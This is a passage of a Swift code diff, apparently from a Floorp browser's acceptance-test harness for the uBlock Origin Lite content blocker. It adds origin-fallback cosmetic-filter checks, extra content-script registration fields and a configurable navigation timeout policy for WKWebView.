+            && crossHostReturn.originFallbackProceduralCosmeticHidden
             && dynamicAndSession.controlScriptExecuted
             && !dynamicAndSession.defaultBlockedScriptExecuted
             && !dynamicAndSession.dynamicBlockedScriptExecuted
@@ -2507,17 +2762,24 @@ private struct FloorpUBOLReleaseAcceptanceReport: Codable {
             && !privateBrowsing.sessionBlockedScriptExecuted
             && privateBrowsing.customCosmeticHidden
             && privateBrowsing.proceduralCosmeticHidden
+            && privateBrowsing.originFallbackCustomCosmeticHidden
+            && privateBrowsing.originFallbackProceduralCosmeticHidden
             && privateBrowsing.genericCosmeticHidden
             && privateBrowsing.highlyGenericCosmeticHidden
             && privateBrowsing.japaneseCosmeticHidden
             && privateBrowsing.japaneseHighlyGenericCosmeticHidden
             && privateBrowsing.stockScriptletExecuted
+            && coldDocumentStart.controlScriptExecuted
+            && coldDocumentStart.customCosmeticHidden
+            && coldDocumentStart.proceduralCosmeticHidden
+            && coldDocumentStart.originFallbackCustomCosmeticHidden
+            && coldDocumentStart.originFallbackProceduralCosmeticHidden
             && backgroundWake.packageVersion == packageVersion
             && backgroundWake.filteringLevel == 3
             && backgroundWake.enabledRulesets == expectedJapanese
             && backgroundWake.customFilterCount == 2
             && backgroundWake.privateAccessPreserved
-            && Set(["css-generic-all", "css-user", "jpn-1.main"])
+            && Set(["css-generic-all", "css-user", "css-user-idle", "jpn-1.main"])
                 .isSubset(of: Set(backgroundWake.registeredContentScripts))
             && contextErrors.isEmpty
     }
@@ -2575,6 +2837,14 @@ private struct FloorpUBOLMatchedRulesWindowAcceptance: Codable {
     }
 }
 
+private struct FloorpUBOLCustomCosmeticFilterStates {
+    let custom: Bool
+    let procedural: Bool
+    let originFallbackCustom: Bool
+    let originFallbackProcedural: Bool
+    let originFallbackDiagnostic: String
+}
+
 private struct FloorpUBOLPageAcceptance: Codable {
     let controlScriptExecuted: Bool
     let defaultBlockedScriptExecuted: Bool
@@ -2582,6 +2852,8 @@ private struct FloorpUBOLPageAcceptance: Codable {
     let sessionBlockedScriptExecuted: Bool
     let customCosmeticHidden: Bool
     let proceduralCosmeticHidden: Bool
+    let originFallbackCustomCosmeticHidden: Bool
+    let originFallbackProceduralCosmeticHidden: Bool
     let genericCosmeticHidden: Bool
     let highlyGenericCosmeticHidden: Bool
     let japaneseCosmeticHidden: Bool
@@ -2603,6 +2875,12 @@ private struct FloorpUBOLPageAcceptance: Codable {
         sessionBlockedScriptExecuted = try boolean("sessionBlockedScriptExecuted")
         customCosmeticHidden = try boolean("customCosmeticHidden")
         proceduralCosmeticHidden = try boolean("proceduralCosmeticHidden")
+        originFallbackCustomCosmeticHidden = try boolean(
+            "originFallbackCustomCosmeticHidden"
+        )
+        originFallbackProceduralCosmeticHidden = try boolean(
+            "originFallbackProceduralCosmeticHidden"
+        )
         genericCosmeticHidden = try boolean("genericCosmeticHidden")
         highlyGenericCosmeticHidden = try boolean("highlyGenericCosmeticHidden")
         japaneseCosmeticHidden = try boolean("japaneseCosmeticHidden")
@@ -2617,6 +2895,8 @@ private struct FloorpUBOLContentScriptRegistration: Codable {
     let matches: [String]
     let excludeMatchCount: Int
     let excludesLocalhost: Bool
+    let allFrames: Bool
+    let matchOriginAsFallback: Bool
     let runAt: String
 
     init(_ dictionary: [String: Any]) throws {
@@ -2625,6 +2905,8 @@ private struct FloorpUBOLContentScriptRegistration: Codable {
               let matches = dictionary["matches"] as? [String],
               let excludeMatchCount = (dictionary["excludeMatchCount"] as? NSNumber)?.intValue,
               let excludesLocalhost = dictionary["excludesLocalhost"] as? Bool,
+              let allFrames = dictionary["allFrames"] as? Bool,
+              let matchOriginAsFallback = dictionary["matchOriginAsFallback"] as? Bool,
               let runAt = dictionary["runAt"] as? String else {
             throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                 "content script registration is invalid: \(dictionary)"
@@ -2635,6 +2917,8 @@ private struct FloorpUBOLContentScriptRegistration: Codable {
         self.matches = matches
         self.excludeMatchCount = excludeMatchCount
         self.excludesLocalhost = excludesLocalhost
+        self.allFrames = allFrames
+        self.matchOriginAsFallback = matchOriginAsFallback
         self.runAt = runAt
     }
 }
@@ -2859,11 +3143,22 @@ extension WKWebView {
 }
 
 @MainActor
+private enum FloorpUBOLNavigationTimeoutPolicy {
+    case stopLoading
+    case preserveWebViewForProcessLifetime
+}
+
+@MainActor
 private final class FloorpUBOLNavigationWaiter: NSObject, WKNavigationDelegate {
     private var continuation: CheckedContinuation<Void, any Error>?
     private var loadToken: UUID?
 
-    func load(_ url: URL, in webView: WKWebView) async throws {
+    func load(
+        _ url: URL,
+        in webView: WKWebView,
+        timeoutNanoseconds: UInt64 = 30_000_000_000,
+        timeoutPolicy: FloorpUBOLNavigationTimeoutPolicy = .stopLoading
+    ) async throws {
         webView.navigationDelegate = self
         let token = UUID()
         loadToken = token
@@ -2871,9 +3166,19 @@ private final class FloorpUBOLNavigationWaiter: NSObject, WKNavigationDelegate {
             self.continuation = continuation
             webView.load(URLRequest(url: url))
             Task { @MainActor [weak self, weak webView] in
-                try? await Task.sleep(nanoseconds: 30_000_000_000)
+                try? await Task.sleep(nanoseconds: timeoutNanoseconds)
                 guard let self, self.loadToken == token else { return }
-                webView?.stopLoading()
+                if let webView {
+                    switch timeoutPolicy {
+                    case .stopLoading:
+                        webView.stopLoading()
+                    case .preserveWebViewForProcessLifetime:
+                        // The navigation delegate may still receive a native
+                        // callback after this Swift timeout. Keep the whole
+                        // document alive and do not stop or detach it.
+                        FloorpNativeWebExtensionProcessLifetimeWebViewRegistry.retain(webView)
+                    }
+                }
                 self.complete(.failure(FloorpUBOLDNRDiagnosticError.navigationTimedOut(url)))
             }
         }
